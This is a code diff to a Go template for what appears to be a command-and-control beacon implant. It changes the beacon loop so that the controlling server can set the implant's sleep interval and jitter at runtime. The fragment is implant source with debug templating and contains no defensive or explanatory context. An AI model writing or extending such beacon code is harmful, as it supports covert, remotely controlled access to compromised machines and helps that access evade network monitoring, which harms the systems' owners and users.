@@ -517,6 +517,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net/http"
 	"os"
@@ -537,6 +538,8 @@ const (
 var (
 	sessionID string
 	sessionMu sync.Mutex
+	currentDelay int = delay
+	currentJitter float64 = jitter
 )
 
 func main() {
@@ -590,10 +593,10 @@ func main() {
 	fmt.Println("[DEBUG] Starting beacon loop...")
 	{{end}}
 	
-	// Beacon loop with jitter
+	// Beacon loop with adaptive jitter
 	for {
 		beacon()
-		sleepDuration := time.Duration(float64(delay) * (1.0 + jitter*(rand.Float64()*2.0-1.0))) * time.Second
+		sleepDuration := time.Duration(float64(currentDelay) * (1.0 + currentJitter*(rand.Float64()*2.0-1.0))) * time.Second
 		{{if .Debug}}
 		fmt.Printf("[DEBUG] Sleeping for %v before next beacon\n", sleepDuration)
 		{{end}}
@@ -795,14 +798,18 @@ func beacon() {
 		}
 		
 		if sleep, ok := response["sleep"].(float64); ok {
+			// Update delay from server response (adaptive sleep)
+			currentDelay = int(sleep)
 			{{if .Debug}}
 			fmt.Printf("[DEBUG] Server sleep interval: %.2f seconds\n", sleep)
 			{{end}}
 		}
 		
-		if jitter, ok := response["jitter"].(float64); ok {
+		if jitterVal, ok := response["jitter"].(float64); ok {
+			// Update jitter from server response
+			currentJitter = jitterVal
 			{{if .Debug}}
-			fmt.Printf("[DEBUG] Server jitter: %.2f%%\n", jitter*100)
+			fmt.Printf("[DEBUG] Server jitter: %.2f%%\n", jitterVal*100)
 			{{end}}
 		}
 	} else {
